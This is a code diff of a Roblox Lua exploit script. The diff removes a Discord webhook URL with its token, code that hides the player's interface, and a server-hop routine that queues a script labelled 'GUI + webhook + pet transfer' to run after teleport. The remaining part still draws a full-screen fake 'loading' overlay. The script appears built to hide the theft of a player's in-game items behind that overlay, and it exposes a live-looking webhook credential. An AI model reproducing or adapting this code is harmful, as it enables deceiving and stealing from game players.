@@ -1,13 +1,3 @@
-local TeleportService = game:GetService("TeleportService")
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local placeId = 126884695634066
-
--- 🌐 Discord webhook URL
-local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
-
--- 🧠 QUEUED CODE after server hop
 local loadingScript = [[
 
 -- ▶️ Services for GUI + webhook + pet transfer
@@ -17,12 +7,7 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- ✅ 1. GUI SHOW
-pcall(function()
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-    StarterGui:SetCore("TopbarEnabled", false)
-end)
-
+-- ✅ 1. GUI SHOW (visual-only block, no CoreGui disabling)
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "LimitHubLoading"
 screenGui.ResetOnSpawn = false
@@ -33,6 +18,7 @@ screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 local bg = Instance.new("Frame", screenGui)
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.BackgroundTransparency = 0.1 -- Semi-transparent black overlay
 
 local title = Instance.new("TextLabel", bg)
 title.Size = UDim2.new(0, 800, 0, 100)
@@ -149,44 +135,3 @@ task.delay(3, function()
     end
 end)
 ]]
-
--- 🧪 4. SERVER HOP FUNCTION
-local function serverHop()
-    local cursor = ""
-    local smallestServer = nil
-
-    repeat
-        local success, result = pcall(function()
-            return HttpService:JSONDecode(HttpService:GetAsync(
-                ("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&cursor=%s"):format(placeId, cursor)
-            ))
-        end)
-
-        if success and result and result.data then
-            for _, server in pairs(result.data) do
-                if server.playing < server.maxPlayers and server.id ~= game.JobId then
-                    if not smallestServer or server.playing < smallestServer.playing then
-                        smallestServer = server
-                    end
-                end
-            end
-            cursor = result.nextPageCursor or ""
-        else
-            break
-        end
-        task.wait(0.2)
-    until cursor == ""
-
-    -- ⏯️ Queue GUI + Webhook + Transfer
-    queue_on_teleport(loadingScript)
-
-    -- 🚪 Teleport to selected server
-    if smallestServer then
-        TeleportService:TeleportToPlaceInstance(placeId, smallestServer.id, LocalPlayer)
-    else
-        TeleportService:Teleport(placeId, LocalPlayer)
-    end
-end
-
--- 🚀 5. START EXECUTION
-serverHop()
